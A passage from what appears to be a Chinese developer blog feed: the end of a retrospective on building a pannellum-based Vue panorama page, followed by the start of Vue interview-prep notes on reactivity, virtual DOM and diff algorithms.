hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/right.png&#x27;)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="四、绘制二级列表和按钮"><a href="#四、绘制二级列表和按钮" class="headerlink" title="四、绘制二级列表和按钮"></a>四、绘制二级列表和按钮</h2><p>最终实现效果如下图：（所有名称、图片都只做测试用）</p><p><img src="https://i.loli.net/2021/07/15/CeJMAgksm5DzBnQ.jpg" alt="Snipaste_2021-07-15_10-38-21.jpg"></p><p>需求：</p><ul><li>点击全景列表，弹出上面所示的二个列表，再次点击隐藏。</li><li>默认为售楼处的第一个场景。点击A型、B型等一级列表会切换二级列表，且都默认进入第一个场景。</li><li>点击二级列表不同图片，进入相应的场景，且边框变黄。</li></ul><h2 id="实现方案-1"><a href="#实现方案-1" class="headerlink" title="实现方案"></a>实现方案</h2><p>①常见的div隐藏显示问题，不过也遇到了一个很常见的错误。通过</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> div_list = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (div_list.style.display == <span class="string">&quot;none&quot;</span>) &#123;</span><br><span class="line">      div_list.style.display = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p>对获取到的div进行样式改变时，报了如下错误：<code>[Cannot set property &#39;display&#39; of undefined]</code> 。</p><p>原因其实是<code>div_list</code>是一个nodelist，因此需要对<code>div_list[0]</code>的style进行修改。</p><p>还有一点就是对display属性进行转换时，若默认为none，则点击按钮会失效，display值将永远为””。最后只能把display改为visibility。</p><p>②先设置一个参数k作为labelList的下标（labelList是一个对象列表，包含test和imageList对象列表），再对一级列表添加showImages事件，改变k值，从而动态绑定到二级列表的图片显示。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;--一级列表--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;label_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in labelList&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showImages(index)&quot;</span>&gt;</span>&#123;&#123; item.text &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&lt;--二级列表--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn_list&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">    <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in labelList[k].imageList&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">    @<span class="attr">click</span>=<span class="string">&quot;toImages(item, index)&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:class</span>=<span class="string">&quot;index == 0 ? &#x27;btn_active&#x27; : &#x27;btn&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:style</span>=<span class="string">&quot;&#123; backgroundImage: &#x27;url(&#x27; + item.url &#125;&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;div_span&quot;</span>&gt;</span>&#123;&#123; item.text &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">showImages</span>(<span class="params">index</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.k = index;</span><br><span class="line">    <span class="built_in">this</span>.toImages(<span class="built_in">this</span>.labelList[index].imageList[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>③很常见，改变css样式就是先把所有的样式改为原来的，然后对选定的样式进行css类名切换。</p><p>切换对应的<code>viewer instance</code>则通过<code>this.url = item.obj;</code>实现。</p><h2 id="五、点击热点事件与列表css样式同步"><a href="#五、点击热点事件与列表css样式同步" class="headerlink" title="五、点击热点事件与列表css样式同步"></a>五、点击热点事件与列表css样式同步</h2><p>解决以上四个问题后，本以为项目接近尾声，但是仍存在小bug，虽然点击列表能正确切换场景，但是通过点击场景中的hotspots切换场景后，列表css样式仍不会改变。</p><h2 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h2><p>本以为这个问题很容易就可以得到解决，因为在<a href="https://pannellum.org/documentation/reference/">pannellum文档</a>中存在<code>clickHandlerFunc</code> 这样一个parameter，能添加此函数作为热点事件的事件处理程序。所以思路很简单，即为hotspots绑定clickHotspot事件，通过传入的args确定下一个场景，从而改变css样式。</p><p>但是事实上<code>clickHandlerFunc</code> 并没有起作用，具体原因我也正尝试与作者取得沟通。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>最后通过大量查找资料，终于在作者github仓库的一个<a href="https://github.com/mpetroff/pannellum/issues/964">issue</a>中找到了答案(已结合项目修改)：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.viewer.on(<span class="string">&#x27;scenechange&#x27;</span>, (<span class="function">(<span class="params">sceneId</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(sceneId)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;place2&quot;</span>:&#123;</span><br><span class="line">      <span class="built_in">this</span>.index=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> btn = <span class="built_in">document</span></span><br><span class="line">    .getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    .getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; btn.length; i++) &#123;</span><br><span class="line">    btn[i].className = <span class="string">&quot;btn&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  btn[<span class="built_in">this</span>.index].className = <span class="string">&quot;btn_active&quot;</span>;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>通过<code>viewer.on(&#39;scenechange&#39;)</code>能传入当前目的地的sceneId，然后根据这个id改变css样式就行。（由于没有后端，只能靠前端判断并写死）</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>与作者沟通结果：</strong>原来是因为<code>sceneId</code>与<code>clickHandlerFunc</code> 发生冲突，点击热点后先进入了下一个场景，因此<code>clickHandlerFunc</code> 未生效。</p><p>因此无需通过<code>this.viewer.on</code>监听场景改变事件，为每个场景的hotSpots添加：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hotSpots: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">pitch</span>: -<span class="number">10</span>,</span><br><span class="line">    <span class="attr">yaw</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">    <span class="comment">// 删去sceneId</span></span><br><span class="line">    <span class="attr">cssClass</span>: <span class="string">&quot;custom-hotspot&quot;</span>,</span><br><span class="line">    <span class="attr">createTooltipFunc</span>: <span class="built_in">this</span>.hotspot,</span><br><span class="line">    <span class="attr">createTooltipArgs</span>: <span class="string">&quot;办公区 up&quot;</span>,</span><br><span class="line">    <span class="attr">clickHandlerFunc</span>: <span class="built_in">this</span>.clickHotspot,</span><br><span class="line">    <span class="attr">clickHandlerArgs</span>: <span class="string">&quot;place2 1&quot;</span>,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>通过<code>clickHandlerArgs</code>传入sceneId和index（css列表改变样式）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//处理点击热点函数</span></span><br><span class="line"><span class="function"><span class="title">clickHotspot</span>(<span class="params">hotSpotDiv, args</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> sceneId = args.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> index = args.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">let</span> btn = <span class="built_in">document</span></span><br><span class="line">    .getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    .getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; btn.length; i++) &#123;</span><br><span class="line">    btn[i].className = <span class="string">&quot;btn&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  btn[index].className = <span class="string">&quot;btn_active&quot;</span>;</span><br><span class="line">  <span class="built_in">this</span>.viewer.loadScene(sceneId);</span><br></pre></td></tr></table></figure><p>感觉起码比方法一switch语句简洁吧。</p><p>此外，为了在初始化后调用<code>this.viewer</code>，需要将init函数变成一个异步函数，再通过事件循环机制处理。此处参考了 <a href="https://www.jianshu.com/p/15a3f2b8613a">pannellum.js 使用</a>。</p><h2 id="六、获取小程序传参（userId、buildingId等）"><a href="#六、获取小程序传参（userId、buildingId等）" class="headerlink" title="六、获取小程序传参（userId、buildingId等）"></a>六、获取小程序传参（userId、buildingId等）</h2><p>小程序拼接的 url 中，param为：<code>?userId=2c9a821c74ee8f0a017505c419d70092&amp;buildingId=2c9a821c641c2a9701642a35fc900000</code> 还需要根据不同的 buildingId 进入不同的 VR 页面。</p><h3 id="实现方案-2"><a href="#实现方案-2" class="headerlink" title="实现方案"></a>实现方案</h3><p>一开始是在具体 vue 文件中对 url 进行解析：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created 钩子函数中</span></span><br><span class="line"><span class="keyword">let</span> message = <span class="built_in">window</span>.location.href.split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">this</span>.userId = message.split(<span class="string">&#x27;&amp;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">this</span>.buildingId = message.split(<span class="string">&#x27;&amp;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>但是参考<a href="https://blog.csdn.net/happy81997/article/details/103873840%EF%BC%8C%E5%AF%B9">https://blog.csdn.net/happy81997/article/details/103873840，对</a> Vue 工程进行优化：在 src 目录下新建 utils 文件夹统一管理工具函数，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getParam.js 该函数作用为根据 str 查找 url 中对应的值</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">getParam</span>(<span class="params">str,url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> paramStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (url.indexOf(<span class="string">&quot;?&quot;</span>) != -<span class="number">1</span>)</span><br><span class="line">        paramStr = url.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> paramList = [], params = [];</span><br><span class="line">    <span class="keyword">if</span> (paramStr.indexOf(<span class="string">&quot;&amp;&quot;</span>) != -<span class="number">1</span>)</span><br><span class="line">        params = paramStr.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> params.push(paramStr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">        paramList[params[i].split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]] = params[i].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> paramList[str];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 App.vue 文件中导入 getParam.js 文件，就能直接使用函数 <code>let id = getParam(&quot;id&quot;, url)</code></p><p><strong>问题二：</strong></p><p>定义 getUrl 函数，根据 id 返回 对应路径（写死）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// utils 下的工具函数文件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(id) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2c9a821c74046c7b01745c0c5edf05c7&#x27;</span>: </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;/unitType1&#x27;</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// App.vue 中 </span></span><br><span class="line"><span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 获取地址</span></span><br><span class="line">  <span class="keyword">let</span> url = <span class="built_in">window</span>.location.href</span><br><span class="line">  <span class="comment">// 获取携带的户型或者楼盘id</span></span><br><span class="line">  <span class="keyword">let</span> id = getParam(<span class="string">&quot;id&quot;</span>, url)</span><br><span class="line">  <span class="comment">// 如果有userId,则存入vuex</span></span><br><span class="line">  <span class="keyword">if</span>(getParam(<span class="string">&quot;userId&quot;</span>, url)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setUserId&quot;</span>, getParam(<span class="string">&quot;userId&quot;</span>, url));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果携带path参数,则为分享出去的VR,直接用path跳转</span></span><br><span class="line">  <span class="keyword">if</span>(getParam(<span class="string">&quot;path&quot;</span>, url)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.$router.replace(&#123;<span class="attr">path</span>: getParam(<span class="string">&quot;path&quot;</span>, url), <span class="attr">query</span>: &#123;<span class="attr">id</span>: id&#125;&#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果不携带,则使用携带的户型或楼盘id进行路由分配</span></span><br><span class="line">    <span class="built_in">this</span>.$router.replace(&#123;<span class="attr">path</span>: getPath(id), <span class="attr">query</span>: &#123;<span class="attr">id</span>: id&#125;&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><h2 id="一、注册的-listener-需要及时销毁"><a href="#一、注册的-listener-需要及时销毁" class="headerlink" title="一、注册的 listener 需要及时销毁"></a>一、注册的 listener 需要及时销毁</h2><p>为了监听页面变化，从而实现响应式页面（rem），注册了 ‘resize’ 的 listener，获得根元素的大小。但是在 destroyed 的生命周期里需要 remove ：</p><p><img src="https://i.loli.net/2021/08/14/qpCBWlLrvf1igam.png" alt="QQ图片20210814154420.png"></p><p>否则监听会一直存在，因为这是单页面应用， 页面并未关闭。</p><h2 id="二、url-中获取的-userId-应存入-Vuex"><a href="#二、url-中获取的-userId-应存入-Vuex" class="headerlink" title="二、url 中获取的 userId 应存入 Vuex"></a>二、url 中获取的 userId 应存入 Vuex</h2><p>新建 store 文件夹，在里面的 index.js 中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="function"><span class="title">setUserId</span>(<span class="params">state,id</span>)</span> &#123;</span><br><span class="line">      state.userId = id;</span><br><span class="line">      sessionStorage.userId = id;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> (sessionStorage.getItem(<span class="string">&quot;userId&quot;</span>)) &#123;</span><br><span class="line">  store.commit(<span class="string">&quot;setUserId&quot;</span>, sessionStorage.getItem(<span class="string">&quot;userId&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure><h1 id="项目总结"><a href="#项目总结" class="headerlink" title="项目总结"></a>项目总结</h1><p>这一个项目最难的还是对pannellum组件的学习：</p><ul><li>入门较难，起初在各大搜索引擎未能找到与项目预期相关性很高的代码，只能从0摸索，进度较慢。（虽然后期通过精确搜索关键词找到了很多相关文章，也解决了一堆问题）</li><li>需对照英文文档查找每一个api的意思并深刻理解，其中由于对 loadScene 的忽视，导致重写了近两次代码，耗费了大量的时间。</li><li>需适当进行对一些 parameter 进行拓展，与项目需求相适应。</li></ul><p>收获最大的是：</p><ul><li>第一次在github上发issue与pannellum组件的作者进行交流，并得到了最后的解决方法。</li><li>第一次发现很多自己不会的问题其他人肯定都遇到过，就看自己能不能找到。比如在pannellum仓库的issue中有近千个提问，四年之前就有人问关于热点点击事件的修改问题了。而当初自己刚使用pannellum组件时，只粗略看了一下文档，完全没有了解issue上的问题。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言-amp-背景&quot;&gt;&lt;a href=&quot;#前言-amp-背景&quot; class=&quot;headerlink&quot; title=&quot;前言&amp;amp;背景&quot;&gt;&lt;/a&gt;前言&amp;amp;背景&lt;/h1&gt;&lt;p&gt;本文是我对实验室校企合作项目——“基于pannellum的全景H5页面实现”的复盘总</summary>
      
    
    
    
    <category term="项目复盘" scheme="https://asura1211.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98/"/>
    
    
  </entry>
  
  <entry>
    <title>【面试准备】— — Vue篇</title>
    <link href="https://asura1211.github.io/2021/07/10/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20Vue%E7%AF%87/"/>
    <id>https://asura1211.github.io/2021/07/10/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20Vue%E7%AF%87/</id>
    <published>2021-07-10T14:02:20.000Z</published>
    <updated>2021-12-07T05:55:56.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是我在复习Vue，准备实习面试时整理的笔记，参考自一些已经整理好的博客：<a href="https://github.com/CavsZhouyou/Front-End-Interview-Notebook/blob/master/Css/Css.md">CSS 面试知识点总结</a>。侵权删。</p><h2 id="Vue-原理"><a href="#Vue-原理" class="headerlink" title="Vue 原理"></a>Vue 原理</h2><p>参考自 <a href="https://juejin.cn/post/6919373017218809864">https://juejin.cn/post/6919373017218809864</a></p><p>当一个Vue实例创建时，Vue会遍历data中的属性，用 Object.defineProperty（vue3.0使用proxy ）将它们转为 getter/setter，并且在内部追踪相关依赖，在属性被访问和修改时通知变化。 每个组件实例都有相应的 watcher 程序实例，它会在组件渲染的过程中把属性记录为依赖，之后当依赖项的setter被调用时，会通知watcher重新计算，从而致使它关联的组件得以更新。</p><h2 id="Vue-双向数据绑定（响应式）原理？（高频）"><a href="#Vue-双向数据绑定（响应式）原理？（高频）" class="headerlink" title="Vue 双向数据绑定（响应式）原理？（高频）"></a>Vue 双向数据绑定（响应式）原理？（高频）</h2><p>vue 的双向数据绑定主要是通过使用<strong>数据劫持</strong>和<strong>发布订阅者模式</strong>来实现 View 和 Model 的同步更新。首先通过 Object.defineProperty() 对 Model 数据各个属性添加访问器属性，以此实现数据的劫持，因此当 Model 中的数据发生变化的时候，可以通过配置的 setter 和 getter 方法实现对 View 层数据更新的通知。</p><p>流程大概如下：</p><ol><li>实现一个监听器 Observer，用来劫持并监听所有属性，如果发生变动，则拿到最新值并通知订阅者。核心方法是<strong>利用 <code>Object.defineProperty()</code> 通过递归的方式对所有属性添加 setter、getter 方法进行监听。</strong></li><li>实现一个解析器 Compile，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图。</li><li>实现一个订阅者 Watcher，作为连接Observer和Compile的桥梁。<ul><li>在自身实例化时往属性订阅器(dep)里面添加自己 </li><li>自身必须有一个update()方法 </li><li>待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调。</li></ul></li><li>MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。</li></ol><p><img src="https://i.loli.net/2021/10/27/g9D4Bciwbz2O7Nr.png" alt="image.png"></p><p>参考资料：<a href="https://segmentfault.com/a/1190000006599500">剖析Vue原理&amp;实现双向绑定MVVM</a></p><p><a href="https://cn.vuejs.org/v2/guide/reactivity.html">https://cn.vuejs.org/v2/guide/reactivity.html</a></p><p><a href="https://segmentfault.com/a/1190000016884795">https://segmentfault.com/a/1190000016884795</a></p><p><a href="https://juejin.cn/post/6854573210285899789">https://juejin.cn/post/6854573210285899789</a></p><p><a href="https://juejin.cn/post/6919373017218809864">https://juejin.cn/post/6919373017218809864</a></p><h3 id="Vue2-给-data-对象添加新属性"><a href="#Vue2-给-data-对象添加新属性" class="headerlink" title="Vue2 给 data 对象添加新属性"></a>Vue2 给 data 对象添加新属性</h3><p>使用Vue的全局 api **$set()**。相当于手动的把obj.b处理成一个响应式的属性，此时视图就会随之改变。</p><p>vm.<code>$set</code> 的实现原理是：</p><ul><li>如果目标是数组，直接使用数组的 splice 方法触发响应式；</li><li>如果目标是对象，会先判读属性是否存在、对象是否是响应式，最终如果要对属性进行响应式处理，则是通过调用 defineReactive 方法进行响应式处理（defineReactive 方法就是 Vue 在初始化对象时，给对象属性采用 Object.defineProperty 动态添加 getter 和 setter 的功能所调用的方法）</li></ul><h3 id="Vue3-对响应式（数组）做了怎样的改进？（高频）"><a href="#Vue3-对响应式（数组）做了怎样的改进？（高频）" class="headerlink" title="Vue3 对响应式（数组）做了怎样的改进？（高频）"></a>Vue3 对响应式（数组）做了怎样的改进？（高频）</h3><p>vue2 在初始化的时候，通过 Object.defineProperty 对 data 的每个属性进行访问和修改的拦截，getter 进行依赖收集、setter 派发更新。Object.defineProperty 的几个缺点：</p><ul><li><p>初始化时需要<strong>遍历对象所有 key</strong>，如果嵌套对象，需要深层监听，造成性能问题</p></li><li><p>动态<strong>新增、删除</strong>对象属性无法拦截，只能用 set/delete api代替</p></li><li><p>无法监控到<strong>数组下标的变化</strong>(监听的性能代价太大)，所以需要对数组 api 方法（”push”,  “pop”,  “shift”,  “unshift”,  “splice”,  “sort”,  “reverse”）进行重写。</p><p>首先获取到这个数组的Observer对象，如果有新的值，就调用observeArray继续对新的值观察变化（也就是通过<code>target__proto__ == arrayMethods</code>来改变了数组实例的型），然后手动调用notify，通知渲染watcher，执行update。</p></li><li><p>不支持新的Map、Set等数据结构</p></li></ul><p>vue3 用 proxy 全面代替 Object.defineProperty。proxy 拦截的是<strong>整个对象</strong>而不是对象的属性。proxy 的优势：</p><ul><li>可以监听多种操作方法，包括动态新增的属性和删除属性、has、apply等操作</li><li>可以监听数组的索引和 length 等属性<strong>（数组的变化）</strong></li><li><strong>懒执行</strong>（在访问到对象属性的时候才会递归代理这个对象属性），不需要初始化的时候递归遍历</li><li>支持 Map，Set，WeakMap 和 WeakSet。</li><li>浏览器新标准，性能更好，并且有持续优化的可能</li></ul><p>更具体见 <a href="https://vue3js.cn/interview/vue3/proxy.html">Vue3.0里为什么要用 Proxy API 替代 defineProperty API ？</a></p><h2 id="什么是-Virtual-DOM？（高频）"><a href="#什么是-Virtual-DOM？（高频）" class="headerlink" title="什么是 Virtual DOM？（高频）"></a>什么是 Virtual DOM？（高频）</h2><p>对将要插入到文档中的 <strong>DOM 树结构进行分析</strong>，<strong>使用 js 对象表示</strong>。比如一个元素对象包含 TagName、props 和 Children 这些属性。然后将这个 js 对象树保存下来，最后再将 DOM 片段插入到文档中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ul = &#123;</span><br><span class="line">  <span class="attr">tagName</span>: <span class="string">&#x27;ul&#x27;</span>,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">class</span>: <span class="string">&#x27;list&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">children</span>: &#123;</span><br><span class="line">    <span class="attr">tagName</span>: <span class="string">&#x27;li&#x27;</span>,</span><br><span class="line">    <span class="attr">children</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码对应的 DOM 就是</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&#x27;list&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>当页面的状态发生改变，需要对 DOM 结构进行调整时，首先根据变更的状态，重新构建起一棵对象树</li><li>然后将这棵新的对象树和旧的对象树进行比较，记录下两棵树的差异</li><li>最后将记录有差异的地方应用到真正的 DOM 树，这样视图就更新了。判断差异的算法分为两步：<ul><li>首先从上至下，从左往右遍历对象，也就是树的深度遍历，这一步会给每个节点添加索引，便于最后渲染差异。（需要判断新旧节点的 <code>tagName</code> 是否相同，如果不相同的话就代表节点被替换。相同则判断是否有子元素，有就进行第二步）</li><li>一旦节点有子元素，就判断子元素是否有不同。（原列表是否有节点被移除、新列表是否有新节点加入、节点是否有移动）</li></ul></li></ol><h3 id="为什么-Virtual-DOM-比原生-DOM-快？"><a href="#为什么-Virtual-DOM-比原生-DOM-快？" class="headerlink" title="为什么 Virtual DOM 比原生 DOM 快？"></a><strong>为什么 Virtual DOM 比原生 DOM 快？</strong></h3><p>Virtual DOM 这种方法对于需要有大量 DOM 操作的时候，能够很好的提高操作效率，通过在操作前确定需要做的最小修改，从而<strong>尽可能减少 DOM 操作带来的回流和重绘影响</strong>。其实 Virtual DOM 并不一定比真实操作 DOM 快，这种方法是为了提高开发时的可维护性：在任意的情况下，都能保证一个尽量小的性能消耗去进行操作。</p><p><strong>Virtual DOM 最大的优势</strong>：</p><ol><li>将 Virtual DOM 作为一个兼容层，让还能对接非 Web 端的系统，实现跨端开发。</li><li>同样的，通过 Virtual DOM 可以渲染到其他的平台，比如实现 SSR、同构渲染等等。</li><li>实现组件的高度抽象化。</li></ol><h3 id="如何比较两个-DOM-树的差异？"><a href="#如何比较两个-DOM-树的差异？" class="headerlink" title="如何比较两个 DOM 树的差异？"></a>如何比较两个 DOM 树的差异？</h3><p>两个树的完全 diff 算法的时间复杂度为 O(n^3) ，但是在前端中，很少会跨层级的移动元素，所以只需要比较同一层级的元素进行比较，这样就可以将算法的时间复杂度降低为 O(n)。</p><p>算法首先会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个序号。在深度遍历的时候，每遍历到一个节点，就将这个节点和新的树中的节点进行比较，如果有差异，则将这个差异记录到一个对象中。</p><p>在对列表元素进行对比的时候，由于 TagName 是重复的，所以不能使用这个来对比。需要给每一个子节点加上一个 key，列表对比的时候使用 key 来进行比较，这样才能够复用老的 DOM 树上的节点。</p><h2 id="Vue-中-diff-算法？-高频"><a href="#Vue-中-diff-算法？-高频" class="headerlink" title="Vue 中 diff 算法？(高频)"></a>Vue 中 diff 算法？(高频)</h2><p>部分参考自<a href="https://juejin.cn/post/6994959998283907102">https://juejin.cn/post/6994959998283907102</a></p><p>Diff 算法是一种<strong>对比算法</strong>。对比旧虚拟 DOM 和新虚拟 DOM，找出发生更改的虚拟节点，并只更新这个虚拟节点所对应的真实节点，而不更新其他节点，实现精准地更新真实 DOM，提高效率。</p><p><strong>原理</strong>：Diff 算法比较只会在同层级进行, 不会跨层级比较。diff 算法是深度优先算法，时间复杂度 O(n)</p><p><strong>对比流程</strong>：当数据改变时，会触发 setter，并且通过 Dep.notify 去通知所有订阅者 